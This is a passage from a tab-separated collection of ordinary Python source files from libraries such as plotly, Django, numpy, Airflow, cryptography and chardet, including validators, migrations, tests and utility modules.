    _complete()
else:
    print('Command not implemented: %s' % sys.argv[1])"
JY371	JY371-_font.py	"import _plotly_utils.basevalidators


class FontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(
        self, plotly_name=""font"", parent_name=""heatmapgl.hoverlabel"", **kwargs
    ):
        super(FontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Font""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
JY444	JY444-features.py	"# Copyright (c) 2020, Oracle and/or its affiliates.
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License, version 2.0, as
# published by the Free Software Foundation.
#
# This program is also distributed with certain software (including
# but not limited to OpenSSL) that is licensed under separate terms,
# as designated in a particular file or component or in included license
# documentation.  The authors of MySQL hereby grant you an
# additional permission to link the program and your derivative works
# with the separately licensed software that they have included with
# MySQL.
#
# Without limiting anything contained in the foregoing, this file,
# which is part of MySQL Connector/Python, is also subject to the
# Universal FOSS Exception, version 1.0, a copy of which can be found at
# http://oss.oracle.com/licenses/universal-foss-exception.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
# See the GNU General Public License, version 2.0, for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software Foundation, Inc.,
# 51 Franklin St, Fifth Floor, Boston, MA 02110-1301  USA

from django.db.backends.mysql.features import DatabaseFeatures as MySQLDatabaseFeatures
from django.utils.functional import cached_property


class DatabaseFeatures(MySQLDatabaseFeatures):
    empty_fetchmany_value = []

    @cached_property
    def can_introspect_check_constraints(self):
        return self.connection.mysql_version >= (8, 0, 16)

    @cached_property
    def supports_microsecond_precision(self):
        if self.connection.mysql_version >= (5, 6, 3):
            return True
        return False"
JD189	JD189-stringutils.py	"""""""
String utility functions.
""""""

from typing import Any, Optional, Union


def safe_repr(obj: Any, clip: Optional[int] = None) -> str:
    """"""
    Convert object to string representation, yielding the same result a `repr`
    but catches all exceptions and returns 'N/A' instead of raising the
    exception. Strings may be truncated by providing `clip`.

    >>> safe_repr(42)
    '42'
    >>> safe_repr('Clipped text', clip=8)
    'Clip..xt'
    >>> safe_repr([1,2,3,4], clip=8)
    '[1,2..4]'
    """"""
    try:
        s = repr(obj)
        if not clip or len(s) <= clip:
            return s
        else:
            return s[:clip - 4] + '..' + s[-2:]
    except:
        return 'N/A'


def trunc(obj: str, max: int, left: bool = False) -> str:
    """"""
    Convert `obj` to string, eliminate newlines and truncate the string to
    `max` characters. If there are more characters in the string add ``...`` to
    the string. With `left=True`, the string can be truncated at the beginning.

    @note: Does not catch exceptions when converting `obj` to string with
        `str`.

    >>> trunc('This is a long text.', 8)
    This ...
    >>> trunc('This is a long text.', 8, left=True)
    ...text.
    """"""
    s = str(obj)
    s = s.replace('\n', '|')
    if len(s) > max:
        if left:
            return '...' + s[len(s) - max + 3:]
        else:
            return s[:(max - 3)] + '...'
    else:
        return s


def pp(i: Union[int, float], base: int = 1024) -> str:
    """"""
    Pretty-print the integer `i` as a human-readable size representation.
    """"""
    degree = 0
    pattern = ""%4d     %s""
    while i > base:
        pattern = ""%7.2f %s""
        i = i / float(base)
        degree += 1
    scales = ['B', 'KB', 'MB', 'GB', 'TB', 'EB']
    return pattern % (i, scales[degree])


def pp_timestamp(t: Optional[float]) -> str:
    """"""
    Get a friendly timestamp represented as a string.
    """"""
    if t is None:
        return ''
    h, m, s = int(t / 3600), int(t / 60 % 60), t % 60
    return ""%02d:%02d:%05.2f"" % (h, m, s)"
JD21	JD21-test_shell_utils.py	"import pytest
import subprocess
import json
import sys

from numpy.distutils import _shell_utils
from numpy.testing import IS_WASM

argv_cases = [
    [r'exe'],
    [r'path/exe'],
    [r'path\exe'],
    [r'\\server\path\exe'],
    [r'path to/exe'],
    [r'path to\exe'],

    [r'exe', '--flag'],
    [r'path/exe', '--flag'],
    [r'path\exe', '--flag'],
    [r'path to/exe', '--flag'],
    [r'path to\exe', '--flag'],

    # flags containing literal quotes in their name
    [r'path to/exe', '--flag-""quoted""'],
    [r'path to\exe', '--flag-""quoted""'],
    [r'path to/exe', '""--flag-quoted""'],
    [r'path to\exe', '""--flag-quoted""'],
]


@pytest.fixture(params=[
    _shell_utils.WindowsParser,
    _shell_utils.PosixParser
])
def Parser(request):
    return request.param


@pytest.fixture
def runner(Parser):
    if Parser != _shell_utils.NativeParser:
        pytest.skip('Unable to run with non-native parser')

    if Parser == _shell_utils.WindowsParser:
        return lambda cmd: subprocess.check_output(cmd)
    elif Parser == _shell_utils.PosixParser:
        # posix has no non-shell string parsing
        return lambda cmd: subprocess.check_output(cmd, shell=True)
    else:
        raise NotImplementedError


@pytest.mark.skipif(IS_WASM, reason=""Cannot start subprocess"")
@pytest.mark.parametrize('argv', argv_cases)
def test_join_matches_subprocess(Parser, runner, argv):
    """"""
    Test that join produces strings understood by subprocess
    """"""
    # invoke python to return its arguments as json
    cmd = [
        sys.executable, '-c',
        'import json, sys; print(json.dumps(sys.argv[1:]))'
    ]
    joined = Parser.join(cmd + argv)
    json_out = runner(joined).decode()
    assert json.loads(json_out) == argv


@pytest.mark.skipif(IS_WASM, reason=""Cannot start subprocess"")
@pytest.mark.parametrize('argv', argv_cases)
def test_roundtrip(Parser, argv):
    """"""
    Test that split is the inverse operation of join
    """"""
    try:
        joined = Parser.join(argv)
        assert argv == Parser.split(joined)
    except NotImplementedError:
        pytest.skip(""Not implemented"")"
JD130	JD130-http.py	"from urllib.parse import unquote, urlparse

from asgiref.testing import ApplicationCommunicator


class HttpCommunicator(ApplicationCommunicator):
    """"""
    ApplicationCommunicator subclass that has HTTP shortcut methods.

    It will construct the scope for you, so you need to pass the application
    (uninstantiated) along with HTTP parameters.

    This does not support full chunking - for that, just use ApplicationCommunicator
    directly.
    """"""

    def __init__(self, application, method, path, body=b"""", headers=None):
        parsed = urlparse(path)
        self.scope = {
            ""type"": ""http"",
            ""http_version"": ""1.1"",
            ""method"": method.upper(),
            ""path"": unquote(parsed.path),
            ""query_string"": parsed.query.encode(""utf-8""),
            ""headers"": headers or [],
        }
        assert isinstance(body, bytes)
        self.body = body
        self.sent_request = False
        super().__init__(application, self.scope)

    async def get_response(self, timeout=1):
        """"""
        Get the application's response. Returns a dict with keys of
        ""body"", ""headers"" and ""status"".
        """"""
        # If we've not sent the request yet, do so
        if not self.sent_request:
            self.sent_request = True
            await self.send_input({""type"": ""http.request"", ""body"": self.body})
        # Get the response start
        response_start = await self.receive_output(timeout)
        assert response_start[""type""] == ""http.response.start""
        # Get all body parts
        response_start[""body""] = b""""
        while True:
            chunk = await self.receive_output(timeout)
            assert chunk[""type""] == ""http.response.body""
            assert isinstance(chunk[""body""], bytes)
            response_start[""body""] += chunk[""body""]
            if not chunk.get(""more_body"", False):
                break
        # Return structured info
        del response_start[""type""]
        response_start.setdefault(""headers"", [])
        return response_start"
JY291	JY291-0116_2_4_0_add_dag_owner_attributes_table.py	"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.
""""""add dag_owner_attributes table

Revision ID: 1486deb605b4
Revises: f4ff391becb5
Create Date: 2022-08-04 16:59:45.406589

""""""
from __future__ import annotations

import sqlalchemy as sa
from alembic import op

from airflow.migrations.db_types import StringID

# revision identifiers, used by Alembic.
revision = ""1486deb605b4""
down_revision = ""f4ff391becb5""
branch_labels = None
depends_on = None
airflow_version = ""2.4.0""


def upgrade():
    """"""Apply Add ``DagOwnerAttributes`` table""""""
    op.create_table(
        ""dag_owner_attributes"",
        sa.Column(""dag_id"", StringID(), nullable=False),
        sa.Column(""owner"", sa.String(length=500), nullable=False),
        sa.Column(""link"", sa.String(length=500), nullable=False),
        sa.ForeignKeyConstraint([""dag_id""], [""dag.dag_id""], ondelete=""CASCADE""),
        sa.PrimaryKeyConstraint(""dag_id"", ""owner""),
    )


def downgrade():
    """"""Unapply Add Dataset model""""""
    op.drop_table(""dag_owner_attributes"")"
JD475	JD475-mish.py	"# coding: utf8
from __future__ import unicode_literals
import numpy

from ... import describe
from .model import Model
from ...describe import Dimension, Synapses, Biases, Gradient


def _set_dimensions_if_needed(model, X, y=None):
    if model.nI is None:
        model.nI = X.shape[1]
    if model.nO is None and y is not None:
        if len(y.shape) == 2:
            model.nO = y.shape[1]
        else:
            model.nO = int(y.max()) + 1


@describe.on_data(_set_dimensions_if_needed)
@describe.attributes(
    nB=Dimension(""Batch size""),
    nI=Dimension(""Input size""),
    nO=Dimension(""Output size""),
    W=Synapses(
        ""Weights matrix"",
        lambda obj: (obj.nO, obj.nI),
        lambda W, ops: ops.xavier_uniform_init(W),
    ),
    b=Biases(""Bias vector"", lambda obj: (obj.nO,)),
    d_W=Gradient(""W""),
    d_b=Gradient(""b""),
)
class Mish(Model):
    """"""Dense layer with mish activation.
    
    https://arxiv.org/pdf/1908.08681.pdf
    """"""
    name = ""mish""

    @property
    def input_shape(self):
        return (self.nB, self.nI)

    @property
    def output_shape(self):
        return (self.nB, self.nO)

    def __init__(self, nO=None, nI=None, **kwargs):
        Model.__init__(self, **kwargs)
        self.nO = nO
        self.nI = nI
        self.drop_factor = kwargs.get(""drop_factor"", 1.0)

    def predict(self, X):
        Y = self.ops.affine(self.W, self.b, X)
        Y = self.ops.mish(Y)
        return Y

    def begin_update(self, X, drop=0.0):
        if drop is None:
            return self.predict(X), None
        Y1 = self.ops.affine(self.W, self.b, X)
        Y2 = self.ops.mish(Y1)
        drop *= self.drop_factor
        Y3, bp_dropout = self.ops.dropout(Y2, drop)

        def finish_update(dY2, sgd=None):
            dY1 = self.ops.backprop_mish(dY2, Y1)
            self.ops.gemm(dY1, X, trans1=True, out=self.d_W)
            self.d_b += dY1.sum(axis=0)
            dX = self.ops.gemm(dY1, self.W)
            if sgd is not None:
                sgd(self._mem.weights, self._mem.gradient, key=self.id)
            return dX

        return Y3, bp_dropout(finish_update)"
JD128	JD128-AuthScramRequest.py	"# automatically generated by the FlatBuffers compiler, do not modify

# namespace: proto

import flatbuffers
from flatbuffers.compat import import_numpy
np = import_numpy()

class AuthScramRequest(object):
    __slots__ = ['_tab']

    @classmethod
    def GetRootAs(cls, buf, offset=0):
        n = flatbuffers.encode.Get(flatbuffers.packer.uoffset, buf, offset)
        x = AuthScramRequest()
        x.Init(buf, n + offset)
        return x

    @classmethod
    def GetRootAsAuthScramRequest(cls, buf, offset=0):
        """"""This method is deprecated. Please switch to GetRootAs.""""""
        return cls.GetRootAs(buf, offset)
    # AuthScramRequest
    def Init(self, buf, pos):
        self._tab = flatbuffers.table.Table(buf, pos)

    # AuthScramRequest
    def Nonce(self):
        o = flatbuffers.number_types.UOffsetTFlags.py_type(self._tab.Offset(4))
        if o != 0:
            return self._tab.String(o + self._tab.Pos)
        return None

    # AuthScramRequest
    def ChannelBinding(self):
        o = flatbuffers.number_types.UOffsetTFlags.py_type(self._tab.Offset(6))
        if o != 0:
            return self._tab.Get(flatbuffers.number_types.Uint8Flags, o + self._tab.Pos)
        return 0

def AuthScramRequestStart(builder): builder.StartObject(2)
def Start(builder):
    return AuthScramRequestStart(builder)
def AuthScramRequestAddNonce(builder, nonce): builder.PrependUOffsetTRelativeSlot(0, flatbuffers.number_types.UOffsetTFlags.py_type(nonce), 0)
def AddNonce(builder, nonce):
    return AuthScramRequestAddNonce(builder, nonce)
def AuthScramRequestAddChannelBinding(builder, channelBinding): builder.PrependUint8Slot(1, channelBinding, 0)
def AddChannelBinding(builder, channelBinding):
    return AuthScramRequestAddChannelBinding(builder, channelBinding)
def AuthScramRequestEnd(builder): return builder.EndObject()
def End(builder):
    return AuthScramRequestEnd(builder)"
JY220	JY220-fallback.py	"from django.contrib.messages.storage.base import BaseStorage
from django.contrib.messages.storage.cookie import CookieStorage
from django.contrib.messages.storage.session import SessionStorage


class FallbackStorage(BaseStorage):
    """"""
    Try to store all messages in the first backend. Store any unstored
    messages in each subsequent backend.
    """"""

    storage_classes = (CookieStorage, SessionStorage)

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.storages = [
            storage_class(*args, **kwargs) for storage_class in self.storage_classes
        ]
        self._used_storages = set()

    def _get(self, *args, **kwargs):
        """"""
        Get a single list of messages from all storage backends.
        """"""
        all_messages = []
        for storage in self.storages:
            messages, all_retrieved = storage._get()
            # If the backend hasn't been used, no more retrieval is necessary.
            if messages is None:
                break
            if messages:
                self._used_storages.add(storage)
            all_messages.extend(messages)
            # If this storage class contained all the messages, no further
            # retrieval is necessary
            if all_retrieved:
                break
        return all_messages, all_retrieved

    def _store(self, messages, response, *args, **kwargs):
        """"""
        Store the messages and return any unstored messages after trying all
        backends.

        For each storage backend, any messages not stored are passed on to the
        next backend.
        """"""
        for storage in self.storages:
            if messages:
                messages = storage._store(messages, response, remove_oldest=False)
            # Even if there are no more messages, continue iterating to ensure
            # storages which contained messages are flushed.
            elif storage in self._used_storages:
                storage._store([], response)
                self._used_storages.remove(storage)
        return messages"
JY175	JY175-formats.py	"# This file is distributed under the same license as the Django package.
#
# The *_FORMAT strings use the Django date format syntax,
# see https://docs.djangoproject.com/en/dev/ref/templates/builtins/#date
DATE_FORMAT = ""l, j F, Y""
TIME_FORMAT = ""h:i a""
DATETIME_FORMAT = ""j F, Y h:i a""
YEAR_MONTH_FORMAT = ""F, Y""
MONTH_DAY_FORMAT = ""j F""
SHORT_DATE_FORMAT = ""j.M.Y""
SHORT_DATETIME_FORMAT = ""j.M.Y H:i""
FIRST_DAY_OF_WEEK = 1  # (Monday)

# The *_INPUT_FORMATS strings use the Python strftime format syntax,
# see https://docs.python.org/library/datetime.html#strftime-strptime-behavior
# Kept ISO formats as they are in first position
DATE_INPUT_FORMATS = [
    ""%Y-%m-%d"",  # '2006-10-25'
    ""%m/%d/%Y"",  # '10/25/2006'
    ""%m/%d/%y"",  # '10/25/06'
    ""%d.%m.%Y"",  # '25.10.2006'
    ""%d.%m.%y"",  # '25.10.06'
    # ""%d %b %Y"",  # '25 Oct 2006'
    # ""%d %b, %Y"",  # '25 Oct, 2006'
    # ""%d %b. %Y"",  # '25 Oct. 2006'
    # ""%d %B %Y"",  # '25 October 2006'
    # ""%d %B, %Y"",  # '25 October, 2006'
]
DATETIME_INPUT_FORMATS = [
    ""%Y-%m-%d %H:%M:%S"",  # '2006-10-25 14:30:59'
    ""%Y-%m-%d %H:%M:%S.%f"",  # '2006-10-25 14:30:59.000200'
    ""%Y-%m-%d %H:%M"",  # '2006-10-25 14:30'
    ""%d.%m.%Y %H:%M:%S"",  # '25.10.2006 14:30:59'
    ""%d.%m.%Y %H:%M:%S.%f"",  # '25.10.2006 14:30:59.000200'
    ""%d.%m.%Y %H:%M"",  # '25.10.2006 14:30'
    ""%d.%m.%y %H:%M:%S"",  # '25.10.06 14:30:59'
    ""%d.%m.%y %H:%M:%S.%f"",  # '25.10.06 14:30:59.000200'
    ""%d.%m.%y %H:%M"",  # '25.10.06 14:30'
    ""%m/%d/%Y %H:%M:%S"",  # '10/25/2006 14:30:59'
    ""%m/%d/%Y %H:%M:%S.%f"",  # '10/25/2006 14:30:59.000200'
    ""%m/%d/%Y %H:%M"",  # '10/25/2006 14:30'
    ""%m/%d/%y %H:%M:%S"",  # '10/25/06 14:30:59'
    ""%m/%d/%y %H:%M:%S.%f"",  # '10/25/06 14:30:59.000200'
    ""%m/%d/%y %H:%M"",  # '10/25/06 14:30'
]
DECIMAL_SEPARATOR = "".""
THOUSAND_SEPARATOR = "" ""
NUMBER_GROUPING = 3"
JD356	JD356-breadcrumbs.py	"from django.urls import get_script_prefix, resolve


def get_breadcrumbs(url, request=None):
    """"""
    Given a url returns a list of breadcrumbs, which are each a
    tuple of (name, url).
    """"""
    from rest_framework.reverse import preserve_builtin_query_params
    from rest_framework.views import APIView

    def breadcrumbs_recursive(url, breadcrumbs_list, prefix, seen):
        """"""
        Add tuples of (name, url) to the breadcrumbs list,
        progressively chomping off parts of the url.
        """"""
        try:
            (view, unused_args, unused_kwargs) = resolve(url)
        except Exception:
            pass
        else:
            # Check if this is a REST framework view,
            # and if so add it to the breadcrumbs
            cls = getattr(view, 'cls', None)
            initkwargs = getattr(view, 'initkwargs', {})
            if cls is not None and issubclass(cls, APIView):
                # Don't list the same view twice in a row.
                # Probably an optional trailing slash.
                if not seen or seen[-1] != view:
                    c = cls(**initkwargs)
                    name = c.get_view_name()
                    insert_url = preserve_builtin_query_params(prefix + url, request)
                    breadcrumbs_list.insert(0, (name, insert_url))
                    seen.append(view)

        if url == '':
            # All done
            return breadcrumbs_list

        elif url.endswith('/'):
            # Drop trailing slash off the end and continue to try to
            # resolve more breadcrumbs
            url = url.rstrip('/')
            return breadcrumbs_recursive(url, breadcrumbs_list, prefix, seen)

        # Drop trailing non-slash off the end and continue to try to
        # resolve more breadcrumbs
        url = url[:url.rfind('/') + 1]
        return breadcrumbs_recursive(url, breadcrumbs_list, prefix, seen)

    prefix = get_script_prefix().rstrip('/')
    url = url[len(prefix):]
    return breadcrumbs_recursive(url, [], prefix, [])"
JY551	JY551-test_matlib.py	"import numpy as np
import numpy.matlib
from numpy.testing import assert_array_equal, assert_

def test_empty():
    x = numpy.matlib.empty((2,))
    assert_(isinstance(x, np.matrix))
    assert_(x.shape, (1, 2))

def test_ones():
    assert_array_equal(numpy.matlib.ones((2, 3)),
                       np.matrix([[ 1.,  1.,  1.],
                                 [ 1.,  1.,  1.]]))

    assert_array_equal(numpy.matlib.ones(2), np.matrix([[ 1.,  1.]]))

def test_zeros():
    assert_array_equal(numpy.matlib.zeros((2, 3)),
                       np.matrix([[ 0.,  0.,  0.],
                                 [ 0.,  0.,  0.]]))

    assert_array_equal(numpy.matlib.zeros(2), np.matrix([[ 0.,  0.]]))

def test_identity():
    x = numpy.matlib.identity(2, dtype=int)
    assert_array_equal(x, np.matrix([[1, 0], [0, 1]]))

def test_eye():
    xc = numpy.matlib.eye(3, k=1, dtype=int)
    assert_array_equal(xc, np.matrix([[ 0,  1,  0],
                                      [ 0,  0,  1],
                                      [ 0,  0,  0]]))
    assert xc.flags.c_contiguous
    assert not xc.flags.f_contiguous

    xf = numpy.matlib.eye(3, 4, dtype=int, order='F')
    assert_array_equal(xf, np.matrix([[ 1,  0,  0,  0],
                                      [ 0,  1,  0,  0],
                                      [ 0,  0,  1,  0]]))
    assert not xf.flags.c_contiguous
    assert xf.flags.f_contiguous

def test_rand():
    x = numpy.matlib.rand(3)
    # check matrix type, array would have shape (3,)
    assert_(x.ndim == 2)

def test_randn():
    x = np.matlib.randn(3)
    # check matrix type, array would have shape (3,)
    assert_(x.ndim == 2)

def test_repmat():
    a1 = np.arange(4)
    x = numpy.matlib.repmat(a1, 2, 2)
    y = np.array([[0, 1, 2, 3, 0, 1, 2, 3],
                  [0, 1, 2, 3, 0, 1, 2, 3]])
    assert_array_equal(x, y)"
JD109	JD109-models.py	"""""""
 The GeometryColumns and SpatialRefSys models for the PostGIS backend.
""""""
from django.contrib.gis.db.backends.base.models import SpatialRefSysMixin
from django.db import models


class PostGISGeometryColumns(models.Model):
    """"""
    The 'geometry_columns' view from PostGIS. See the PostGIS
    documentation at Ch. 4.3.2.
    """"""
    f_table_catalog = models.CharField(max_length=256)
    f_table_schema = models.CharField(max_length=256)
    f_table_name = models.CharField(max_length=256)
    f_geometry_column = models.CharField(max_length=256)
    coord_dimension = models.IntegerField()
    srid = models.IntegerField(primary_key=True)
    type = models.CharField(max_length=30)

    class Meta:
        app_label = 'gis'
        db_table = 'geometry_columns'
        managed = False

    def __str__(self):
        return '%s.%s - %dD %s field (SRID: %d)' % (
            self.f_table_name,
            self.f_geometry_column,
            self.coord_dimension,
            self.type,
            self.srid,
        )

    @classmethod
    def table_name_col(cls):
        """"""
        Return the name of the metadata column used to store the feature table
        name.
        """"""
        return 'f_table_name'

    @classmethod
    def geom_col_name(cls):
        """"""
        Return the name of the metadata column used to store the feature
        geometry column.
        """"""
        return 'f_geometry_column'


class PostGISSpatialRefSys(models.Model, SpatialRefSysMixin):
    """"""
    The 'spatial_ref_sys' table from PostGIS. See the PostGIS
    documentation at Ch. 4.2.1.
    """"""
    srid = models.IntegerField(primary_key=True)
    auth_name = models.CharField(max_length=256)
    auth_srid = models.IntegerField()
    srtext = models.CharField(max_length=2048)
    proj4text = models.CharField(max_length=2048)

    class Meta:
        app_label = 'gis'
        db_table = 'spatial_ref_sys'
        managed = False

    @property
    def wkt(self):
        return self.srtext"
JY238	JY238-__init__.py	"# -*- coding: utf_8 -*-
""""""
Charset-Normalizer
~~~~~~~~~~~~~~
The Real First Universal Charset Detector.
A library that helps you read text from an unknown charset encoding.
Motivated by chardet, This package is trying to resolve the issue by taking a new approach.
All IANA character set names for which the Python core library provides codecs are supported.

Basic usage:
   >>> from charset_normalizer import from_bytes
   >>> results = from_bytes('Bсеки човек има право на образование. Oбразованието!'.encode('utf_8'))
   >>> best_guess = results.best()
   >>> str(best_guess)
   'Bсеки човек има право на образование. Oбразованието!'

Others methods and usages are available - see the full documentation
at <https://github.com/Ousret/charset_normalizer>.
:copyright: (c) 2021 by Ahmed TAHRI
:license: MIT, see LICENSE for more details.
""""""
import logging

from .api import from_bytes, from_fp, from_path, normalize
from .legacy import (
    CharsetDetector,
    CharsetDoctor,
    CharsetNormalizerMatch,
    CharsetNormalizerMatches,
    detect,
)
from .models import CharsetMatch, CharsetMatches
from .utils import set_logging_handler
from .version import VERSION, __version__

__all__ = (
    ""from_fp"",
    ""from_path"",
    ""from_bytes"",
    ""normalize"",
    ""detect"",
    ""CharsetMatch"",
    ""CharsetMatches"",
    ""CharsetNormalizerMatch"",
    ""CharsetNormalizerMatches"",
    ""CharsetDetector"",
    ""CharsetDoctor"",
    ""__version__"",
    ""VERSION"",
    ""set_logging_handler"",
)

# Attach a NullHandler to the top level logger by default
# https://docs.python.org/3.3/howto/logging.html#configuring-logging-for-a-library

logging.getLogger(""charset_normalizer"").addHandler(logging.NullHandler())"
JY306	JY306-_hoverlabel.py	"import _plotly_utils.basevalidators


class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""hoverlabel"", parent_name=""pie"", **kwargs):
        super(HoverlabelValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            align
                Sets the horizontal alignment of the text
                content within hover label box. Has an effect
                only if the hover label text spans more two or
                more lines
            alignsrc
                Sets the source reference on Chart Studio Cloud
                for `align`.
            bgcolor
                Sets the background color of the hover labels
                for this trace
            bgcolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bgcolor`.
            bordercolor
                Sets the border color of the hover labels for
                this trace.
            bordercolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bordercolor`.
            font
                Sets the font used in hover labels.
            namelength
                Sets the default length (in number of
                characters) of the trace name in the hover
                labels for all traces. -1 shows the whole name
                regardless of length. 0-3 shows the first 0-3
                characters, and an integer >3 will show the
                whole name if it is less than that many
                characters, but if it is longer, will truncate
                to `namelength - 3` characters and add an
                ellipsis.
            namelengthsrc
                Sets the source reference on Chart Studio Cloud
                for `namelength`.
"""""",
            ),
            **kwargs,
        )"
JY252	JY252-genericworker.py	"#!/usr/bin/python3
# -*- coding: utf-8 -*-
#
#    Copyright (C) 2022 by YOUR NAME HERE
#
#    This file is part of RoboComp
#
#    RoboComp is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    RoboComp is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with RoboComp.  If not, see <http://www.gnu.org/licenses/>.

import sys, Ice, os
from PySide2 import QtWidgets, QtCore

ROBOCOMP = ''
try:
    ROBOCOMP = os.environ['ROBOCOMP']
except KeyError:
    print('$ROBOCOMP environment variable not set, using the default value /opt/robocomp')
    ROBOCOMP = '/opt/robocomp'

Ice.loadSlice(""-I ./src/ --all ./src/CommonBehavior.ice"")
import RoboCompCommonBehavior




class GenericWorker(QtCore.QObject):

    kill = QtCore.Signal()

    def __init__(self, mprx):
        super(GenericWorker, self).__init__()

        self.camerasimple_proxy = mprx[""CameraSimpleProxy""]

        self.mutex = QtCore.QMutex(QtCore.QMutex.Recursive)
        self.Period = 30
        self.timer = QtCore.QTimer(self)


    @QtCore.Slot()
    def killYourSelf(self):
        rDebug(""Killing myself"")
        self.kill.emit()

    # \brief Change compute period
    # @param per Period in ms
    @QtCore.Slot(int)
    def setPeriod(self, p):
        print(""Period changed"", p)
        self.Period = p
        self.timer.start(self.Period)"
JY154	JY154-mbcsgroupprober.py	"######################## BEGIN LICENSE BLOCK ########################
# The Original Code is Mozilla Universal charset detector code.
#
# The Initial Developer of the Original Code is
# Netscape Communications Corporation.
# Portions created by the Initial Developer are Copyright (C) 2001
# the Initial Developer. All Rights Reserved.
#
# Contributor(s):
#   Mark Pilgrim - port to Python
#   Shy Shalom - original C code
#   Proofpoint, Inc.
#
# This library is free software; you can redistribute it and/or
# modify it under the terms of the GNU Lesser General Public
# License as published by the Free Software Foundation; either
# version 2.1 of the License, or (at your option) any later version.
#
# This library is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public
# License along with this library; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA
# 02110-1301  USA
######################### END LICENSE BLOCK #########################

from .charsetgroupprober import CharSetGroupProber
from .utf8prober import UTF8Prober
from .sjisprober import SJISProber
from .eucjpprober import EUCJPProber
from .gb2312prober import GB2312Prober
from .euckrprober import EUCKRProber
from .cp949prober import CP949Prober
from .big5prober import Big5Prober
from .euctwprober import EUCTWProber


class MBCSGroupProber(CharSetGroupProber):
    def __init__(self, lang_filter=None):
        super(MBCSGroupProber, self).__init__(lang_filter=lang_filter)
        self.probers = [
            UTF8Prober(),
            SJISProber(),
            EUCJPProber(),
            GB2312Prober(),
            EUCKRProber(),
            CP949Prober(),
            Big5Prober(),
            EUCTWProber()
        ]
        self.reset()"
JD129	JD129-x963kdf.py	"# This file is dual licensed under the terms of the Apache License, Version
# 2.0, and the BSD License. See the LICENSE file in the root of this repository
# for complete details.


import typing

from cryptography import utils
from cryptography.exceptions import AlreadyFinalized, InvalidKey
from cryptography.hazmat.primitives import constant_time, hashes
from cryptography.hazmat.primitives.kdf import KeyDerivationFunction


def _int_to_u32be(n: int) -> bytes:
    return n.to_bytes(length=4, byteorder=""big"")


class X963KDF(KeyDerivationFunction):
    def __init__(
        self,
        algorithm: hashes.HashAlgorithm,
        length: int,
        sharedinfo: typing.Optional[bytes],
        backend: typing.Any = None,
    ):
        max_len = algorithm.digest_size * (2**32 - 1)
        if length > max_len:
            raise ValueError(
                ""Cannot derive keys larger than {} bits."".format(max_len)
            )
        if sharedinfo is not None:
            utils._check_bytes(""sharedinfo"", sharedinfo)

        self._algorithm = algorithm
        self._length = length
        self._sharedinfo = sharedinfo
        self._used = False

    def derive(self, key_material: bytes) -> bytes:
        if self._used:
            raise AlreadyFinalized
        self._used = True
        utils._check_byteslike(""key_material"", key_material)
        output = [b""""]
        outlen = 0
        counter = 1

        while self._length > outlen:
            h = hashes.Hash(self._algorithm)
            h.update(key_material)
            h.update(_int_to_u32be(counter))
            if self._sharedinfo is not None:
                h.update(self._sharedinfo)
            output.append(h.finalize())
            outlen += len(output[-1])
            counter += 1

        return b"""".join(output)[: self._length]

    def verify(self, key_material: bytes, expected_key: bytes) -> None:
        if not constant_time.bytes_eq(self.derive(key_material), expected_key):
            raise InvalidKey"
JY75	JY75-install_scripts.py	"""""""distutils.command.install_scripts

Implements the Distutils 'install_scripts' command, for installing
Python scripts.""""""

# contributed by Bastian Kleineidam

import os
from distutils.core import Command
from distutils import log
from stat import ST_MODE


class install_scripts(Command):
    description = ""install scripts (Python or otherwise)""

    user_options = [
        (""install-dir="", ""d"", ""directory to install scripts to""),
        (""build-dir="", ""b"", ""build directory (where to install from)""),
